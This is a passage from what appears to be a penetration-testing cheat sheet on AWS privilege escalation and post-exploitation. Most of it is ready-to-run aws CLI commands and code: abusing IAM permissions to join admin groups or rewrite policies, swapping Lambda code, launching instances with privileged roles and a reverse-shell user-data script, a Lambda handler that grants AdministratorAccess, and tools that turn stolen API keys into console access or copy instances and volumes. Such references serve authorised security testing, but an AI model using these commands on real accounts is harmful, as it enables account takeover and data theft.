  <li><strong>iam:CreatePolicy</strong> : add a stealthy admin policy</li>
  <li><strong>iam:AddUserToGroup</strong> : add into the admin group of the organization.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">add-user-to-group</span><span class="w"> </span><span class="err">–</span><span class="nx">group-name</span><span class="w"> </span><span class="nx">target_group</span><span class="w"> </span><span class="err">–</span><span class="nx">user-name</span><span class="w"> </span><span class="nx">my_username</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:UpdateAssumeRolePolicy</strong> + <strong>sts:AssumeRole</strong> : change the assuming permissions of a privileged role and then assume it with a non-privileged account.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">update-assume-role-policy</span><span class="w"> </span><span class="err">–</span><span class="nx">role-name</span><span class="w"> </span><span class="nx">role_i_can_assume</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-document</span><span class="w"> </span><span class="nx">file://path/to/assume/role/policy.json</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:CreatePolicyVersion</strong> &amp; <strong>iam:SetDefaultPolicyVersion</strong> : change customer-managed policies and change a non-privileged entity to be a privileged one.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">create-policy-version</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-arn</span><span class="w"> </span><span class="nx">target_policy_arn</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-document</span><span class="w"> </span><span class="nx">file://path/to/administrator/policy.json</span><span class="w"> </span><span class="err">–</span><span class="nx">set-as-default</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">iam</span><span class="w"> </span><span class="nx">set-default-policy-version</span><span class="w"> </span><span class="err">–</span><span class="nx">policy-arn</span><span class="w"> </span><span class="nx">target_policy_arn</span><span class="w"> </span><span class="err">–</span><span class="nx">version-id</span><span class="w"> </span><span class="nx">v2</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>lambda:UpdateFunctionCode</strong> : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">lambda</span><span class="w"> </span><span class="nx">update-function-code</span><span class="w"> </span><span class="err">–</span><span class="nx">function-name</span><span class="w"> </span><span class="nx">target_function</span><span class="w"> </span><span class="err">–</span><span class="nx">zip-file</span><span class="w"> </span><span class="nx">fileb://my/lambda/code/zipped.zip</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>glue:UpdateDevEndpoint</strong> : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">glue</span><span class="w"> </span><span class="err">–</span><span class="nx">endpoint-name</span><span class="w"> </span><span class="nx">target_endpoint</span><span class="w"> </span><span class="err">–</span><span class="nx">public-key</span><span class="w"> </span><span class="nx">file://path/to/my/public/ssh/key.pub</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><strong>iam:PassRole</strong> + <strong>ec2:CreateInstanceProfile</strong>/<strong>ec2:AddRoleToInstanceProfile</strong> : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.</p>
  </li>
  <li><strong>iam:PassRole</strong> + <strong>ec2:RunInstance</strong> : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="c"># add ssh key</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">run-instances</span><span class="w"> </span><span class="err">–</span><span class="nx">image-id</span><span class="w"> </span><span class="nx">ami-a4dc46db</span><span class="w"> </span><span class="err">–</span><span class="nx">instance-type</span><span class="w"> </span><span class="nx">t2.micro</span><span class="w"> </span><span class="err">–</span><span class="nx">iam-instance-profile</span><span class="w"> </span><span class="nx">Name</span><span class="o">=</span><span class="n">iam-full-access-ip</span><span class="w"> </span><span class="err">–</span><span class="nx">key-name</span><span class="w"> </span><span class="nx">my_ssh_key</span><span class="w"> </span><span class="err">–</span><span class="nx">security-group-ids</span><span class="w"> </span><span class="nx">sg-123456</span><span class="w">
  </span><span class="c"># execute a reverse shell</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">run-instances</span><span class="w"> </span><span class="err">–</span><span class="nx">image-id</span><span class="w"> </span><span class="nx">ami-a4dc46db</span><span class="w"> </span><span class="err">–</span><span class="nx">instance-type</span><span class="w"> </span><span class="nx">t2.micro</span><span class="w"> </span><span class="err">–</span><span class="nx">iam-instance-profile</span><span class="w"> </span><span class="nx">Name</span><span class="o">=</span><span class="n">iam-full-access-ip</span><span class="w"> </span><span class="err">–</span><span class="nx">user-data</span><span class="w"> </span><span class="nx">file://script/with/reverse/shell.sh</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:PassRole</strong> + <strong>lambda:CreateFunction</strong> + <strong>lambda:InvokeFunction</strong> : give a user access to the privileges associated with any Lambda service role that exists in the account.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">lambda</span><span class="w"> </span><span class="nx">create-function</span><span class="w"> </span><span class="err">–</span><span class="nx">function-name</span><span class="w"> </span><span class="nx">my_function</span><span class="w"> </span><span class="err">–</span><span class="nx">runtime</span><span class="w"> </span><span class="nx">python3.6</span><span class="w"> </span><span class="err">–</span><span class="nx">role</span><span class="w"> </span><span class="nx">arn_of_lambda_role</span><span class="w"> </span><span class="err">–</span><span class="nx">handler</span><span class="w"> </span><span class="nx">lambda_function.lambda_handler</span><span class="w"> </span><span class="err">–</span><span class="nx">code</span><span class="w"> </span><span class="nx">file://my/python/code.py</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">lambda</span><span class="w"> </span><span class="nx">invoke</span><span class="w"> </span><span class="err">–</span><span class="nx">function-name</span><span class="w"> </span><span class="nx">my_function</span><span class="w"> </span><span class="nx">output.txt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
    <p>Example of code.py</p>
    <div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>  <span class="kn">import</span> <span class="nn">boto3</span>
  <span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
      <span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="n">client</span><span class="p">(</span><span class="s">'iam'</span><span class="p">)</span>
      <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">attach_user_policy</span><span class="p">(</span>
      <span class="n">UserName</span><span class="o">=</span><span class="s">'my_username'</span><span class="p">,</span>
      <span class="n">PolicyArn</span><span class="o">=</span><span class="s">"arn:aws:iam::aws:policy/AdministratorAccess"</span>
      <span class="p">)</span>
      <span class="k">return</span> <span class="n">response</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>iam:PassRole</strong> + <strong>glue:CreateDevEndpoint</strong> : access to the privileges associated with any Glue service role that exists in the account.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">glue</span><span class="w"> </span><span class="nx">create-dev-endpoint</span><span class="w"> </span><span class="err">–</span><span class="nx">endpoint-name</span><span class="w"> </span><span class="nx">my_dev_endpoint</span><span class="w"> </span><span class="err">–</span><span class="nx">role-arn</span><span class="w"> </span><span class="nx">arn_of_glue_service_role</span><span class="w"> </span><span class="err">–</span><span class="nx">public-key</span><span class="w"> </span><span class="nx">file://path/to/my/public/ssh/key.pub</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="aws---gaining-aws-console-access-via-api-keys">AWS - Gaining AWS Console Access via API Keys</h2>

<p>A utility to convert your AWS CLI credentials into AWS console access.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="err">$&gt;</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/NetSPI/aws_consoler</span><span class="w">
</span><span class="err">$&gt;</span><span class="w"> </span><span class="n">aws_consoler</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">AKIA</span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span><span class="w">
</span><span class="mi">2020</span><span class="nt">-03-13</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">57</span><span class="p">,</span><span class="mi">800</span><span class="w"> </span><span class="p">[</span><span class="n">aws_consoler.cli</span><span class="p">]</span><span class="w"> </span><span class="n">INFO:</span><span class="w"> </span><span class="nx">Validating</span><span class="w"> </span><span class="nx">arguments...</span><span class="w">
</span><span class="mi">2020</span><span class="nt">-03-13</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">57</span><span class="p">,</span><span class="mi">801</span><span class="w"> </span><span class="p">[</span><span class="n">aws_consoler.cli</span><span class="p">]</span><span class="w"> </span><span class="n">INFO:</span><span class="w"> </span><span class="nx">Calling</span><span class="w"> </span><span class="nx">logic.</span><span class="w">
</span><span class="mi">2020</span><span class="nt">-03-13</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">57</span><span class="p">,</span><span class="mi">820</span><span class="w"> </span><span class="p">[</span><span class="n">aws_consoler.logic</span><span class="p">]</span><span class="w"> </span><span class="n">INFO:</span><span class="w"> </span><span class="nx">Boto3</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nx">established.</span><span class="w">
</span><span class="mi">2020</span><span class="nt">-03-13</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">58</span><span class="p">,</span><span class="mi">193</span><span class="w"> </span><span class="p">[</span><span class="n">aws_consoler.logic</span><span class="p">]</span><span class="w"> </span><span class="n">WARNING:</span><span class="w"> </span><span class="nx">Creds</span><span class="w"> </span><span class="nx">still</span><span class="w"> </span><span class="nx">permanent</span><span class="p">,</span><span class="w"> </span><span class="nx">creating</span><span class="w"> </span><span class="nx">federated</span><span class="w"> </span><span class="nx">session.</span><span class="w">
</span><span class="mi">2020</span><span class="nt">-03-13</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">58</span><span class="p">,</span><span class="mi">698</span><span class="w"> </span><span class="p">[</span><span class="n">aws_consoler.logic</span><span class="p">]</span><span class="w"> </span><span class="n">INFO:</span><span class="w"> </span><span class="nx">New</span><span class="w"> </span><span class="nx">federated</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nx">established.</span><span class="w">
</span><span class="mi">2020</span><span class="nt">-03-13</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">59</span><span class="p">,</span><span class="mi">153</span><span class="w"> </span><span class="p">[</span><span class="n">aws_consoler.logic</span><span class="p">]</span><span class="w"> </span><span class="n">INFO:</span><span class="w"> </span><span class="nx">Session</span><span class="w"> </span><span class="nx">valid</span><span class="p">,</span><span class="w"> </span><span class="nx">attempting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">federate</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">arn:aws:sts::123456789012:federated-user/aws_consoler.</span><span class="w">
</span><span class="mi">2020</span><span class="nt">-03-13</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">59</span><span class="p">,</span><span class="mi">668</span><span class="w"> </span><span class="p">[</span><span class="n">aws_consoler.logic</span><span class="p">]</span><span class="w"> </span><span class="n">INFO:</span><span class="w"> </span><span class="nx">URL</span><span class="w"> </span><span class="nx">generated</span><span class="o">!</span><span class="w">
</span><span class="n">https://signin.aws.amazon.com/federation</span><span class="nf">?</span><span class="nx">Action</span><span class="o">=</span><span class="nx">login</span><span class="o">&amp;</span><span class="nx">Issuer</span><span class="o">=</span><span class="n">consoler.local</span><span class="o">&amp;</span><span class="nx">Destination</span><span class="o">=</span><span class="n">https</span><span class="o">%</span><span class="nx">3A</span><span class="o">%</span><span class="nx">2F</span><span class="o">%</span><span class="nx">2Fconsole.aws.amazon.com</span><span class="o">%</span><span class="nx">2Fconsole</span><span class="o">%</span><span class="nx">2Fhome</span><span class="o">%</span><span class="nx">3Fregion</span><span class="o">%</span><span class="nx">3Dus-east-1</span><span class="o">&amp;</span><span class="nx">SigninToken</span><span class="o">=</span><span class="p">[</span><span class="n">REDACTED</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="aws---enumerate-iam-permissions">AWS - Enumerate IAM permissions</h2>

<p>Enumerate the permissions associated with AWS credential set with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">git</span><span class="err">@</span><span class="nx">github.com:andresriancho/enumerate-iam.git</span><span class="w">
</span><span class="n">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">requirements.txt</span><span class="w">
</span><span class="o">.</span><span class="n">/enumerate-iam.py</span><span class="w"> </span><span class="nt">--access-key</span><span class="w"> </span><span class="nx">AKIA...</span><span class="w"> </span><span class="nt">--secret-key</span><span class="w"> </span><span class="nx">StF0q...</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">58</span><span class="p">,</span><span class="mi">447</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="nx">permission</span><span class="w"> </span><span class="nx">enumeration</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">access-key-id</span><span class="w"> </span><span class="s2">"AKIA..."</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">01</span><span class="p">,</span><span class="mi">532</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">Run</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">hills</span><span class="p">,</span><span class="w"> </span><span class="nx">get_account_authorization_details</span><span class="w"> </span><span class="nx">worked</span><span class="o">!</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">01</span><span class="p">,</span><span class="mi">537</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="s2">"RoleDetailList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
            </span><span class="s2">"AssumeRolePolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="s2">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2008-10-17"</span><span class="p">,</span><span class="w">
                </span><span class="s2">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                    </span><span class="p">{</span><span class="w">
</span><span class="o">...</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">26</span><span class="p">,</span><span class="mi">709</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">gamelift.list_builds</span><span class="p">()</span><span class="w"> </span><span class="n">worked</span><span class="o">!</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">26</span><span class="p">,</span><span class="mi">850</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">cloudformation.list_stack_sets</span><span class="p">()</span><span class="w"> </span><span class="n">worked</span><span class="o">!</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">26</span><span class="p">,</span><span class="mi">982</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">directconnect.describe_locations</span><span class="p">()</span><span class="w"> </span><span class="n">worked</span><span class="o">!</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">27</span><span class="p">,</span><span class="mi">021</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">gamelift.describe_matchmaking_rule_sets</span><span class="p">()</span><span class="w"> </span><span class="n">worked</span><span class="o">!</span><span class="w">
</span><span class="mi">2019</span><span class="nt">-05-10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">27</span><span class="p">,</span><span class="mi">311</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">21345</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">sqs.list_queues</span><span class="p">()</span><span class="w"> </span><span class="n">worked</span><span class="o">!</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="aws---mount-ebs-volume-to-ec2-linux">AWS - Mount EBS volume to EC2 Linux</h2>

<p>:warning: EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken.</p>

<ol>
  <li>Head over to EC2 –&gt; Volumes and create a new volume of your preferred size and type.</li>
  <li>Select the created volume, right click and select the “attach volume” option.</li>
  <li>Select the instance from the instance text box as shown below : <code class="language-plaintext highlighter-rouge">attach ebs volume</code>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">create-volume</span><span class="w"> </span><span class="err">–</span><span class="nx">snapshot-id</span><span class="w"> </span><span class="nx">snapshot_id</span><span class="w"> </span><span class="nt">--availability-zone</span><span class="w"> </span><span class="nx">zone</span><span class="w">
</span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">attach-volume</span><span class="w"> </span><span class="err">–</span><span class="nt">-volume-id</span><span class="w"> </span><span class="nx">volume_id</span><span class="w"> </span><span class="err">–</span><span class="nt">-instance-id</span><span class="w"> </span><span class="nx">instance_id</span><span class="w"> </span><span class="nt">--device</span><span class="w"> </span><span class="nx">device</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Now, login to your ec2 instance and list the available disks using the following command : <code class="language-plaintext highlighter-rouge">lsblk</code></li>
  <li>Check if the volume has any data using the following command : <code class="language-plaintext highlighter-rouge">sudo file -s /dev/xvdf</code></li>
  <li>Format the volume to ext4 filesystem  using the following command : <code class="language-plaintext highlighter-rouge">sudo mkfs -t ext4 /dev/xvdf</code></li>
  <li>Create a directory of your choice to mount our new ext4 volume. I am using the name “newvolume” : <code class="language-plaintext highlighter-rouge">sudo mkdir /newvolume</code></li>
  <li>Mount the volume to “newvolume” directory using the following command : <code class="language-plaintext highlighter-rouge">sudo mount /dev/xvdf /newvolume/</code></li>
  <li>cd into newvolume directory and check the disk space for confirming the volume mount : <code class="language-plaintext highlighter-rouge">cd /newvolume; df -h .</code></li>
</ol>

<h2 id="aws---copy-ec2-using-ami-image">AWS - Copy EC2 using AMI Image</h2>

<p>First you need to extract data about the current instances and their AMI/security groups/subnet : <code class="language-plaintext highlighter-rouge">aws ec2 describe-images --region eu-west-1</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="c"># create a new image for the instance-id</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">create-image</span><span class="w"> </span><span class="nt">--instance-id</span><span class="w"> </span><span class="nx">i-0438b003d81cd7ec5</span><span class="w"> </span><span class="nt">--name</span><span class="w"> </span><span class="s2">"AWS Audit"</span><span class="w"> </span><span class="nt">--description</span><span class="w"> </span><span class="s2">"Export AMI"</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w">  

</span><span class="c"># add key to AWS</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">import-key-pair</span><span class="w"> </span><span class="nt">--key-name</span><span class="w"> </span><span class="s2">"AWS Audit"</span><span class="w"> </span><span class="nt">--public-key-material</span><span class="w"> </span><span class="nx">file://~/.ssh/id_rsa.pub</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w">  

</span><span class="c"># create ec2 using the previously created AMI, use the same security group and subnet to connect easily.</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">run-instances</span><span class="w"> </span><span class="nt">--image-id</span><span class="w"> </span><span class="nx">ami-0b77e2d906b00202d</span><span class="w"> </span><span class="nt">--security-group-ids</span><span class="w"> </span><span class="s2">"sg-6d0d7f01"</span><span class="w"> </span><span class="nt">--subnet-id</span><span class="w"> </span><span class="nx">subnet-9eb001ea</span><span class="w"> </span><span class="nt">--count</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">--instance-type</span><span class="w"> </span><span class="nx">t2.micro</span><span class="w"> </span><span class="nt">--key-name</span><span class="w"> </span><span class="s2">"AWS Audit"</span><span class="w"> </span><span class="nt">--query</span><span class="w"> </span><span class="s2">"Instances[0].InstanceId"</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w">

</span><span class="c"># now you can check the instance </span><span class="w">
</span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">describe-instances</span><span class="w"> </span><span class="nt">--instance-ids</span><span class="w"> </span><span class="nx">i-0546910a0c18725a1</span><span class="w"> 

</span><span class="c"># If needed : edit groups</span><span class="w">
</span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">modify-instance-attribute</span><span class="w"> </span><span class="nt">--instance-id</span><span class="w"> </span><span class="s2">"i-0546910a0c18725a1"</span><span class="w"> </span><span class="nt">--groups</span><span class="w"> </span><span class="s2">"sg-6d0d7f01"</span><span class="w">  </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w">

</span><span class="c"># be a good guy, clean our instance to avoid any useless cost</span><span class="w">
</span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">stop-instances</span><span class="w"> </span><span class="nt">--instance-id</span><span class="w"> </span><span class="s2">"i-0546910a0c18725a1"</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w"> 
</span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">terminate-instances</span><span class="w"> </span><span class="nt">--instance-id</span><span class="w"> </span><span class="s2">"i-0546910a0c18725a1"</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="aws---instance-connect---push-an-ssh-key-to-ec2-instance">AWS - Instance Connect - Push an SSH key to EC2 instance</h2>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="c"># https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">aws</span><span class="w"> </span><span class="nx">ec2</span><span class="w"> </span><span class="nx">describe-instances</span><span class="w"> </span><span class="nt">--profile</span><span class="w"> </span><span class="nx">uploadcreds</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">eu-west-1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">jq</span><span class="w"> </span><span class="s2">".[][].Instances | .[] | {InstanceId, KeyName, State}"</span><span class="w">
